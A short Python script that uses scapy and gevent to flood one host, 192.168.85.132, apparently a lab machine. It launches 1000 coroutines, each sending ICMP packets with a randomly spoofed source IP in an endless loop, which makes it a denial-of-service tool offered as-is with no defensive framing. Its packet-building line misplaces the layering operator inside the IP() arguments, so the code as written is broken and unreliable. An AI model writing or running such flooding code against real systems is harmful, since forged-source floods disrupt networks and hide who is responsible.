'''
Use multi coroutine to imitate multiple attackers

'''

from gevent import monkey
monkey.patch_all()

import gevent

from scapy.all import *
import random
nums = 1000 # the number of attacks

def start():
    for i in range(nums):
        a, b, c, d = random.randint(100, 255), random.randint(100, 255), random.randint(100, 255), \
                     random.randint(100, 255)
        src_ip = f'{a}.{b}.{c}.{d}'
        gevent.spawn(attack, src_ip, i)

def attack(src, i):
    try:
        while True:
            send(IP(src=src, dst='192.168.85.132', ttl=60 / ICMP()))
    except Exception as e:
        print(e)

if __name__ == '__main__':
    start()
